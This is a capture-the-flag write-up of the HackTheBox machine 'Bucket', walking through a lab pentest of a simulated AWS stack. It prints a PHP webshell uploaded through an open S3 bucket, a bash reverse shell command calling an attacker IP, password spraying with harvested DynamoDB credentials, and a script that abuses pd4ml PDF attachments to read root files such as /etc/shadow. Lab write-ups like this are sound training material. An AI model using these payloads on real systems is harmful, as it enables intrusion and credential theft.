---
title: HTB: Bucket
url: https://0xdf.gitlab.io/2021/04/24/htb-bucket.html
date: 2021-04-24T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, htb-bucket, hackthebox, s3, aws, awscli, nmap, vhosts, wfuzz, upload, webshell, php, credentials, password-reuse, dynamodb, tunnel, localstack, pd4ml, pdfdetach, getfacl, facl
---

![Bucket](https://0xdfimages.gitlab.io/img/bucket-cover.png)

Bucket is a pentest against an Amazon AWS stack. There’s an S3 bucket that is being used to host a website and is configured to allow unauthenticated read / write. I’ll upload a webshell to get a foothold on the box. From there, I’ll access the DynamoDB instance to find some passwords, one of which is reused for the user on the box. There’s another webserver on localhost with a in-development service that creates a PDF based on entries in the database. I’ll exploit that to get file read on the system as root, and turn that into a root shell. In Beyond Root, I’ll look at some of the configuration that allowed the box to simulate AWS inside HTB.

## Box Info

| Name | [Bucket](https://hackthebox.com/machines/bucket)  [Bucket](https://hackthebox.com/machines/bucket) [Play on HackTheBox](https://hackthebox.com/machines/bucket) |
| --- | --- |
| Release Date | [17 Oct 2020](https://twitter.com/hackthebox_eu/status/1342455310812852227) |
| Retire Date | 24 Apr 2021 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Bucket |
| Radar Graph | Radar chart for Bucket |
| First Blood User | 00:41:20[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| First Blood Root | 01:20:22[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| Creator | [MrR3boot MrR3boot](https://app.hackthebox.com/users/13531) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.212
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-01 20:43 EST
Nmap scan report for 10.10.10.212
Host is up (0.019s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds
root@kali# nmap -p 22,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.212
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-01 20:43 EST
Nmap scan report for 10.10.10.212
Host is up (0.015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://bucket.htb/
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.46 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu Focal 20.04.

The webserver on TCP 80 is returning a redirect to `http://bucket.htb`. I’ll want to fuzz for virtual hosts.

### bucket.htb - TCP 80

Visiting `http://10.10.10.212` returns an HTTP 302 redirect to `http://bucket.htb`. After updating `/etc/hosts`, the page loads a site for the Bucket Advertising Platform:

![image-20210201204752931](https://0xdfimages.gitlab.io/img/image-20210201204752931.png)

Looking at the page source, the images are loaded from `s3.bucket.htb`, for example:

```

<img src="http://s3.bucket.htb/adserver/images/bug.jpg" alt="Bug" height="160" width="160">

```

After updating my `hosts` file again, now the images load:

![image-20210201205443352](https://0xdfimages.gitlab.io/img/image-20210201205443352.png)

There’s not much else here. The response headers don’t reveal much. `index.php` doesn’t exist, but rather the main page is `index.html`. There’s an email address, `support@bucket.htb`.

I ran `gobuster`, but didn’t find anything.

### Subdomain Fuzz

Given the use of different virtual hosts (vhosts), I used `wfuzz` to look for others:

```

root@kali# wfuzz -c -u http://10.10.10.212 -H "Host: FUZZ.bucket.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 26
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.212/
Total requests: 19983

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000247:   404        0 L      2 W        21 Ch       "s3"
000009543:   400        12 L     53 W       422 Ch      "#www"
000010595:   400        12 L     53 W       422 Ch      "#mail"

Total time: 0
Processed Requests: 19983
Filtered Requests: 19980
Requests/sec.: 0

```

The two starting with `#` likely error out due to the `#`, and I already knew about `s3`.

### s3.bucket.htb

#### Site

I noticed above that the `s3.bucket.htb` domain returned a 404 status code in the fuzz above. In the browser, it just shows JSON about the status:

![image-20210201210151933](https://0xdfimages.gitlab.io/img/image-20210201210151933.png)

In Burp, the full response is:

```

HTTP/1.1 404 
Date: Tue, 02 Feb 2021 02:03:20 GMT
Server: hypercorn-h11
content-type: text/html; charset=utf-8
content-length: 21
access-control-allow-origin: *
access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
access-control-allow-headers: authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging
access-control-expose-headers: x-amz-version-id
Connection: close

{"status": "running"}

```

Googling for any of these headers with `amz` in them will return a bunch of Amazon AWS docs. Given the name of the machine, the subdomain name, and now these headers, it’s pretty clear this machine will have some focus on simulating Amazon Cloud services.

#### Main Site on S3

Given that the images are hosted in this instance of S3, it seems likely that the site pages are as well. I can test this by trying to get `index.html`:

```

root@kali# curl -s http://s3.bucket.htb/adserver/index.html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title></title>
<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box
...[snip]...

```

That matches the page.

### AWS Overview

There’s a handful of AWS terms that are useful to understand here:
- Amazon Web Services (AWS) - Amazon’s suite of cloud services all go under the name AWS
- Simple Storage Service (S3) - This service is where customers can store objects, which are data, assign permissions to that data, and make it available over API and/or HTTP(S) calls. People use S3 for hosting websites, data backups, hosting data lakes, and many more things.
- bucket - An area of storage associated with an account. Each bucket will have a unique name that is used to access it. There was a challenge involving looking for a bucket with loose permissions in the [2020 Sans Holiday Hack](/holidayhack2020/2).

I’ve already seen urls that fit the typical S3 format hosting the images on the webpage:

```

http://s3.bucket.htb/adserver/images/bug.jpg

```

It’s common to see these urls as `http://s3.[host]/[bucket name]/[file]`.

Interacting with a S3 bucket can be done over `curl`, but as the interactions get more complicated, it’s easier to use `aws` command line interface (`apt install awscli`). `aws help` will load a manual page for the client, including listing a large number of subcommands like `s3` which I’ll use heavily for Bucket. The `--endpoint-url` option will be important as I want to go to Bucket from HTB instead of to AWS S3.

## Shell as www-data

### Upload to Bucket

Depending on the permissions assigned to the bucket, I may or may not have to authenticate to upload to it. `aws s3 help` provides another manual page, and at the very bottom is a list of subcommands. `ls` is interesting, but it fails:

```

root@kali# aws s3 --endpoint-url http://s3.bucket.htb ls
Unable to locate credentials. You can configure credentials by running "aws configure".

```

The typical case for S3 is that credentials are required to administer a bucket. Still, if the bucket is misconfigured (or configured to allow anonymous access), then those creds won’t be validated, so I’ll try adding some. It works:

```

root@kali# aws configure
AWS Access Key ID [None]: 0xdf
AWS Secret Access Key [None]: 0xdf
Default region name [None]: bucket
Default output format [None]: 

root@kali# aws s3 --endpoint-url http://s3.bucket.htb ls
2021-02-02 06:36:03 adserver

```

There’s a single bucket on this server that I can access with those bogus creds. I can look inside it by providing an S3URI of the format `aws s3 ls s3://mybucket` (from `aws s3 ls help`).

The bucket contains `index.html` and an `images` directory with the three images from the page:

```

root@kali# aws s3 --endpoint-url http://s3.bucket.htb ls s3://adserver
                           PRE images/
2021-02-02 06:38:04       5344 index.html
root@kali# aws s3 --endpoint-url http://s3.bucket.htb ls s3://adserver/images/
2021-02-02 06:40:04      37840 bug.jpg
2021-02-02 06:40:04      51485 cloud.png
2021-02-02 06:40:04      16486 malware.png

```

Another command was `cp`. I’ll create a dummy file to upload, and use `cp` to upload it:

```

root@kali# echo "Test file" > test.txt
root@kali# aws s3 --endpoint-url http://s3.bucket.htb cp test.txt s3://adserver/0xdf.txt
upload: ./test.txt to s3://adserver/0xdf.txt

```

It’s there, but it doesn’t return from the main url:

```

root@kali# aws s3 --endpoint-url http://s3.bucket.htb ls s3://adserver/
                           PRE images/
2021-02-02 06:42:13         10 0xdf.txt
2021-02-02 06:42:04       5344 index.html

root@kali# curl http://bucket.htb/0xdf.txt
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at bucket.htb Port 80</address>
</body></html>

```

I wonder if only `.html` pages are being hosted? I’ll upload the same file with a `.html` extension, and after a few seconds, the file is available via the main site:

```

root@kali# aws s3 --endpoint-url http://s3.bucket.htb cp test.txt s3://adserver/0xdf.html
upload: ./test.txt to s3://adserver/0xdf.html                     
root@kali# curl http://bucket.htb/0xdf.html
Test file

```

It doesn’t host `.txt`, but it does host `.html`. What about `.php`?

```

root@kali# aws s3 --endpoint-url http://s3.bucket.htb cp test.txt s3://adserver/0xdf.php
upload: ./test.txt to s3://adserver/0xdf.php                      
root@kali# curl http://bucket.htb/0xdf.php
Test file

```

It does. That means it’s likely to execute PHP as well.

### Webshell Upload

I’ll upload a simple webshell:

```

root@kali# cat /opt/shells/php/cmd.php
<?php system($_REQUEST["cmd"]); ?>
root@kali# aws s3 --endpoint-url http://s3.bucket.htb cp /opt/shells/php/cmd.php s3://adserver/
upload: /opt/shells/php/cmd.php to s3://adserver/cmd.php

```

It takes a minute, but eventually it shows up and executes:

```

root@kali# curl http://bucket.htb/cmd.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

There’s clearly something also clearing out the bucket every minute or two, so if the webshell disappears, I’ll need to re-upload it.

I’ll go deeper into that automation (how the script gets to Bucket) in [More Beyond Root](/2021/05/03/more-bucket-beyond-root.html).

### Shell

To go from webshell to shell, I’ll use the Bash reverse shell:

```

root@kali# curl http://bucket.htb/cmd.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1'"

```

At `nc`, the connection provides a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.212.
Ncat: Connection from 10.10.10.212:47408.
bash: cannot set terminal process group (922): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bucket:/var/www/html$

```

I’ll upgrade to a full PTY:

```

www-data@bucket:/var/www/html$ python3 -c 'import pty;pty.spawn("bash")'
python3 -c 'import pty;pty.spawn("bash")'
www-data@bucket:/var/www/html$ ^Z
[1]+  Stopped                 nc -lnvp 443
root@kali# stty raw -echo ; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@bucket:/var/www/html$ 

```

## Shell as roy

### Enumeration

#### Web

The shell starts in `/var/www/html`, where there’s only `index.html`. I’ll upload the webshell again, and after a short wait, it shows up:

```

www-data@bucket:/var/www/html$ ls -l
total 12
-rw-r--r-- 1 root root   35 Feb  2 12:01 cmd.php
-rw-r--r-- 1 root root 5344 Feb  2 12:01 index.html

```

It’s interesting that that file is owned by root. www-data does not have permission to write here.

There’s another folder in `/var/www`, `bucket-app`. I don’t have permissions to access this either:

```

www-data@bucket:/var/www$ ls -l
total 8
drwxr-x---+ 4 root root 4096 Sep 23 10:56 bucket-app
drwxr-xr-x  2 root root 4096 Feb  2 12:02 html

```

`bucket-app` is owned by root, but there’s a plus at the end of the permissions string. That means it has extended permissions, or ACLs:

```

www-data@bucket:/var/www$ getfacl bucket-app/
# file: bucket-app/
# owner: root
# group: root
user::rwx
user:roy:r-x
group::r-x
mask::r-x
other::---

```

roy has access to this directory to read and execute.

#### Home Dirs

There’s only one directory in `/home`, for roy. I can’t read `user.txt` yet, but there’s also a `project` directory:

```

www-data@bucket:/home/roy$ ls -la
total 28
drwxr-xr-x 3 roy  roy  4096 Sep 24 03:16 .
drwxr-xr-x 3 root root 4096 Sep 16 12:59 ..
lrwxrwxrwx 1 roy  roy     9 Sep 16 12:59 .bash_history -> /dev/null
-rw-r--r-- 1 roy  roy   220 Sep 16 12:59 .bash_logout
-rw-r--r-- 1 roy  roy  3771 Sep 16 12:59 .bashrc
-rw-r--r-- 1 roy  roy   807 Sep 16 12:59 .profile
drwxr-xr-x 3 roy  roy  4096 Sep 24 03:16 project
-r-------- 1 roy  roy    33 Jan 31 13:54 user.txt

```

It contains four files:

```

www-data@bucket:/home/roy/project$ ls
composer.json  composer.lock  db.php  vendor

```

### Database

#### Via awscli

`db.php` contains connection information to [DynamoDB](https://aws.amazon.com/dynamodb/), which is AWS’ NoSQL database instance. The command line client for is happens to be `aws`, which is installed on Bucket. There’s a good list of subcommands in `aws dynamodb help`. `list-tables` seems like a good place to start.

On Bucket, it complains about the config again:

```

www-data@bucket:/home/roy/project$ aws --endpoint-url http://127.0.0.1:4566 dynamodb list-tables
You must specify a region. You can also configure your region by running "aws configure".

```

Unfortunately, I can’t save preferences here as www-data:

```

www-data@bucket:/etc/apache2/sites-enabled$ aws configure
AWS Access Key ID [None]: 0xdf
AWS Secret Access Key [None]: 0xdf
Default region name [None]: bucket
Default output format [None]: 

[Errno 13] Permission denied: '/var/www/.aws'

```

However, I am able to connect from my host (I’ll dig into why a bit in [Beyond Root](#beyond-root)):

```

root@kali# aws --endpoint-url http://s3.bucket.htb dynamodb list-tables
{
    "TableNames": [
        "users"
    ]
}

```

The `scan` subcommand seems like the one to use to dump an entire table. The `users` table has three users with passwords:

```

root@kali# aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users
{
    "Items": [
        {
            "password": {
                "S": "Management@#1@#"
            },
            "username": {
                "S": "Mgmt"
            }
        },
        {
            "password": {
                "S": "Welcome123!"
            },
            "username": {
                "S": "Cloudadm"
            }
        },
        {
            "password": {
                "S": "n2vM-<_K_Q:.Aa2"
            },
            "username": {
                "S": "Sysadm"
            }
        }
    ],
    "Count": 3,
    "ScannedCount": 3,
    "ConsumedCapacity": null
}

```

#### DynamoDB Shell

AWS has this web front end for interacting with DynamoDB using Javascript, and since it seems that requests are passing through to that, it makes sense that that shell is also available at `http://s3.bucket.htb/shell/`:

![image-20210422114620963](https://0xdfimages.gitlab.io/img/image-20210422114620963.png)

I had a hard time getting this to work in Firefox, but it worked in Chromium. Others I talked to didn’t have that issue. There are [issues with Edge](https://stackoverflow.com/questions/45156215/how-to-fix-a-crc32-error-with-dynamodb-access-from-a-ms-edge-browser), so it could be some setting in my Firefix.

The `</>` button will offer a bunch of templates. I’ll pick the one for “List Tables”. Both the params are optional, so I’ll delete them, leaving:

```

var params = {};
dynamodb.listTables(params, function(err, data) {
    if (err) ppJson(err); // an error occurred
    else ppJson(data); // successful response
});

```

On running this, results are returned (this is where in Firefox I got CRC32 errors):

![image-20210422114828245](https://0xdfimages.gitlab.io/img/image-20210422114828245.png)

Similarly, it can dump the data using `scan`:

```

var params = {
    TableName: 'users',
}
dynamodb.scan(params, function(err, data) {
    if (err) ppJson(err); // an error occurred
    else ppJson(data); // successful response
});

```

Resulting in:

![image-20210422115301678](https://0xdfimages.gitlab.io/img/image-20210422115301678.png)

It’s worth noting that I was able to access these passwords on DynamoDB without any auth, and so if I did manage to leak a username, or was willing to brute force on via a password spray attack, I could skip the webshell upload entirely and go right to the next step as roy.

### SSH

I’ve got one user, roy, and three passwords. I’ll use `jq` to dump the passwords to a file:

```

root@kali# aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users | jq -r '.Items[].password.S'
Management@#1@#
Welcome123!
n2vM-<_K_Q:.Aa2
root@kali# aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users | jq -r '.Items[].password.S' > passwords

```

With that list, I can use [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) to test them one by one:

```

root@kali# crackmapexec ssh 10.10.10.212 -u roy -p passwords 
SSH         10.10.10.212    22     10.10.10.212     [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
SSH         10.10.10.212    22     10.10.10.212     [-] roy:Management@#1@# Authentication failed.
SSH         10.10.10.212    22     10.10.10.212     [-] roy:Welcome123! Authentication failed.
SSH         10.10.10.212    22     10.10.10.212     [+] roy:n2vM-<_K_Q:.Aa2 

```

The last one works!

```

root@kali# sshpass -p 'n2vM-<_K_Q:.Aa2' ssh roy@10.10.10.212
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)
...[snip]...
Last login: Wed Sep 23 03:33:53 2020 from 10.10.14.14
roy@bucket:~$

```

I can now grab `user.txt`:

```

roy@bucket:~$ cat user.txt
2de9f236************************

```

## Shell as root

### Enumeration

#### Web

`netstat` shows a service listening on 8000 only on localhost (as well as 4566, which I’ll explore in [Beyond Root](#beyond-root)):

```

roy@bucket:/var/www/bucket-app$ netstat -tnl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:33555         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN 

```

In `/etc/apache2/sites-enabled/000-default.conf` it defines both the main site on 80 and the `bucket-app` site listening on 8000 only on localhost:

```

<VirtualHost 127.0.0.1:8000>
        <IfModule mpm_itk_module>
                AssignUserId root root
        </IfModule>
        DocumentRoot /var/www/bucket-app
</VirtualHost>

<VirtualHost *:80>
        DocumentRoot /var/www/html
        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^bucket.htb$
        RewriteRule /.* http://bucket.htb/ [R]
</VirtualHost>
<VirtualHost *:80>
        ProxyPreserveHost on
        ProxyPass / http://localhost:4566/
        ProxyPassReverse / http://localhost:4566/
        <Proxy *>
                 Order deny,allow
                 Allow from all
         </Proxy>
        ServerAdmin webmaster@localhost
        ServerName s3.bucket.htb
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

```

`AssignUserId root root` means that the application on 8000 is also running as root!

I’ll reconnect with an SSH tunnel (`-L 8000:localhost:8000`). This will start a listener on port 8000 on my VM, and any packets sent to it will be sent through the SSH session and then to localhost port 8000 on Bucket.

The page just says it’s under construction:

![image-20210203164921125](https://0xdfimages.gitlab.io/img/image-20210203164921125.png)

#### Source

roy can access `bucket-app`:

```

roy@bucket:/var/www/bucket-app$ ls -l
total 848
-rw-r-x---+  1 root root     63 Sep 23 02:23 composer.json
-rw-r-x---+  1 root root  20533 Sep 23 02:23 composer.lock
drwxr-x---+  2 root root   4096 Sep 23 03:29 files
-rwxr-x---+  1 root root  17222 Sep 23 03:32 index.php
-rwxr-x---+  1 root root 808729 Jun 10  2020 pd4ml_demo.jar
drwxr-x---+ 10 root root   4096 Sep 23 02:23 vendor

```

At the top of `index.php`, there’s some code:

```

<?php
require 'vendor/autoload.php';
use Aws\DynamoDb\DynamoDbClient;
if($_SERVER["REQUEST_METHOD"]==="POST") {
        if($_POST["action"]==="get_alerts") {
                date_default_timezone_set('America/New_York');
                $client = new DynamoDbClient([
                        'profile' => 'default',
                        'region'  => 'us-east-1',
                        'version' => 'latest',
                        'endpoint' => 'http://localhost:4566'
                ]);

                $iterator = $client->getIterator('Scan', array(
                        'TableName' => 'alerts',
                        'FilterExpression' => "title = :title",
                        'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
                ));

                foreach ($iterator as $item) {
                        $name=rand(1,10000).'.html';
                        file_put_contents('files/'.$name,$item["data"]);
                }
                passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
        }
}
else
{
?>

```

On a POST request with the `action` parameter set to “get\_alerts”, it will query the DynamoDbClient for alerts that contain “Ransomware” in the title column. For each result, it will create a random filename in `files` and write the contents of the data column into that file.

Then it calls the [pd4ml](https://pd4ml.com/) Jar on that temporary HTML file to convert it to PDF.

### Test Bucket App

To test this, I’ll need to put entries into the database in the table `alerts` with a `title` that includes the string “Ransomware” and the data I want to see in the `data` column.

I already looked at the local Dynamo in a previous step. There was no table `alerts`. I’ll create one. The command `aws dynamodb create-table help` and [this page](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/getting-started-step-1.html) provide the syntax:

```

root@kali# aws --endpoint-url http://s3.bucket.htb dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5
{
    "TableDescription": {
        "AttributeDefinitions": [
            {
                "AttributeName": "title",
                "AttributeType": "S"
            },
            {
                "AttributeName": "data",
                "AttributeType": "S"
            }
        ],
        "TableName": "alerts",
        "KeySchema": [
            {
                "AttributeName": "title",
                "KeyType": "HASH"
            },
            {
                "AttributeName": "data",
                "KeyType": "RANGE"
            }
        ],
        "TableStatus": "ACTIVE",
        "CreationDateTime": 1612409699.649,
        "ProvisionedThroughput": {
            "LastIncreaseDateTime": 0.0,
            "LastDecreaseDateTime": 0.0,
            "NumberOfDecreasesToday": 0,
            "ReadCapacityUnits": 10,
            "WriteCapacityUnits": 5
        },
        "TableSizeBytes": 0,
        "ItemCount": 0,
        "TableArn": "arn:aws:dynamodb:us-east-1:000000000000:table/alerts"
    }
}

```

The table now shows up in the list:

```

root@kali# aws --endpoint-url http://s3.bucket.htb dynamodb list-tables              
{                      
    "TableNames": [
        "alerts",
        "users"
    ]
}

```

Now I can add an item to the table:

```

root@kali# aws --endpoint-url http://s3.bucket.htb dynamodb put-item --table-name alerts --item '{"title":{"S":"Ransomware"},"data":{"S":"This is a test"}}'
{
    "ConsumedCapacity": {
        "TableName": "alerts",
        "CapacityUnits": 1.0
    }
}

```

And then trigger the page with a `curl`:

```

root@kali# curl http://127.0.0.1:8000/index.php --data 'action=get_alerts'

```

Back in the shell as roy, two files show up in `files` based on the data in the table:

```

roy@bucket:/var/www/bucket-app/files$ ls
5295.html  result.pdf
roy@bucket:/var/www/bucket-app/files$ cat 5295.html 
This is a test

```

I’ll copy the PDF back with `scp`:

```

root@kali# sshpass -p 'n2vM-<_K_Q:.Aa2' scp roy@10.10.10.212:/var/www/bucket-app/files/result.pdf .

```

It also has my data:

![image-20210203223939555](https://0xdfimages.gitlab.io/img/image-20210203223939555.png)

### File Read

#### POC

In reading about pd4ml, I found this [list of examples](https://pd4ml.tech/support-topics/usage-examples/). One of them caught my eye - [Add Attachment](https://pd4ml.tech/support-topics/usage-examples/#add-attachment). [This page](https://pd4ml.com/cookbook/pdf-attachments.htm) has more examples of tags that can be added. I’ll build a payload that looks like:

```

<html><pd4ml:attachment src="/etc/passwd" description="attachment sample" icon="Paperclip"/></html>

```

The database is constantly being cleared (every minute?), so I may need to recreate the table, and then I’ll add this to it:

```

root@kali# aws --endpoint-url http://s3.bucket.htb dynamodb put-item --table-name alerts --item '{"title":{"S":"Ransomware"},"data":{"S":"<html><pd4ml:attachment src=\"/etc/passwd\" description=\"attachment sample\" icon=\"Paperclip\"/></html>"}}'
{
    "ConsumedCapacity": {
        "TableName": "alerts",
        "CapacityUnits": 1.0
    }
}

```

Now I’ll use `curl` to trigger it:

```

root@kali# curl http://127.0.0.1:8000/index.php --data 'action=get_alerts'

```

And get the PDF with `scp`:

![image-20210204092622819](https://0xdfimages.gitlab.io/img/image-20210204092622819.png)

Double clicking on the paperclip pops a prompt to open the file:

![image-20210204092705422](https://0xdfimages.gitlab.io/img/image-20210204092705422.png)

It worked!

```

root@kali# tail passwd
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
roy:x:1000:1000:,,,:/home/roy:/bin/bash

```

#### Script

It got frustrating to work with when the box was clearing the table every minute, so I wrote a script the handle it:

```

#!/bin/bash

target=$1

# delete table
aws --endpoint-url http://s3.bucket.htb dynamodb delete-table --table-name alerts 2>/dev/null >/dev/null
# create table
aws --endpoint-url http://s3.bucket.htb dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH             AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 >/dev/null
# put entry into table; use commandline arg as target file
aws --endpoint-url http://s3.bucket.htb dynamodb put-item --table-name alerts --item '{"title":{"S":"Ransomware"},"data":{"S":"<html><pd4ml:attachment src=\"'"$target"'\" description=\"attachment sample\" icon=\"Paperclip\"/></        html>"}}' >/dev/null
# sleep to allow DB to sync
sleep 0.2
# trigger PDF generation
curl -s http://127.0.0.1:8000/index.php --data 'action=get_alerts'
# sleep to allow PDF generation
sleep 0.2
# get pdf
sshpass -p 'n2vM-<_K_Q:.Aa2' scp roy@10.10.10.212:/var/www/bucket-app/files/result.pdf .

# extract 
tfile="/tmp/bucket-pdf-out"
pdfdetach result.pdf -save 1 -o $tfile
cat $tfile
rm $tfile

```

It’s using a tool `pdfdetach` from [Xpdf](https://www.xpdfreader.com/pdfdetach-man.html) (`apt install xpdf`) to pull the attachments out and then show the results.

```

root@kali# ./get_file.sh /etc/shadow | tail
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
landscape:*:18375:0:99999:7:::
pollinate:*:18375:0:99999:7:::
sshd:*:18389:0:99999:7:::
systemd-coredump:!!:18389::::::
lxd:!:18389::::::
dnsmasq:*:18521:0:99999:7:::
roy:$6$R5354aq0yPE29fSL$8O/upWMMuS5VvWFIuIcJT3HutzjaHd7Bk6cmJX4CyYewZh3pQCOJqhQQtvCRhjZzxR5H5efsrbsM1D8naAllp0:18526:0:99999:7:::

```

One cool thing about these attachments - if I try to attach a directory, it will attach a dir list:

```

root@kali# ./get_file.sh /var/www/bucket-app
composer.json
composer.lock
files
index.php
pd4ml_demo.jar
vendor

```

### SSH

Using the script, I can now enumerate the box as root. In the homedir, there’s the flag:

```

root@kali# ./get_file.sh /root
.aws
.bash_history
.bashrc
.cache
.config
.java
.local
.profile
.ssh
backups
docker-compose.yml
files
restore.php
restore.sh
root.txt
snap
start.sh
sync.sh

```

I can grab it:

```

root@kali# ./get_file.sh /root/root.txt
3ba9e5dd************************

```

There’s also a `.ssh` directory that contains a key pair, and the public key is in the `authorized_keys` file:

```

root@kali# ./get_file.sh /root/.ssh
authorized_keys
id_rsa
id_rsa.pub
root@kali# ./get_file.sh /root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHpWmEozLG6uOV2Zvp3LU5KfQP126YUBQJ5KggLCGGyr59p3HbVJRtCv+6eh8quaA0wCGOascKIxqmYPDV1zKPg9I+3Cjoi+tXQa7K7fgtrDURq/2xXWGDMMubz20AHt+HYk3w4H/h23SxbEfHNZ8KYcXkMFZKXF2T4rgfa8n55MDYXFPa14s+Yl3sb2a9qeHVW1y2kI6Lr4Ixy/Ugy90W0EtuJ599MA4XWtIl2zibTQymqrAOJB2A3mCFw65tNeLdxuPP24JMG1c7Z1wt8cCqGphJrt4zTHmnBfngev1I/SomnnLS56tqI52hIkPlKaAF8h8LNQNkAyd17dgZnRDhrzoFWCwPZWXnj72Ggs5gyyJX2DhLvr4+YGK7CL9avG2jLOvf+G0lWYKmb5Z86vhBBnIIUBWjbWwt8ioxw8GqW6vkW+ta1RQIDS6x/H+PjRX+XlYAiKgg5fReZfSSWXV/o/vX538FcBA2/K39o56edp+C/OyPbfDmbiw5ME06AGU= root@ubuntu
root@kali# ./get_file.sh /root/.ssh/id_rsa.pub
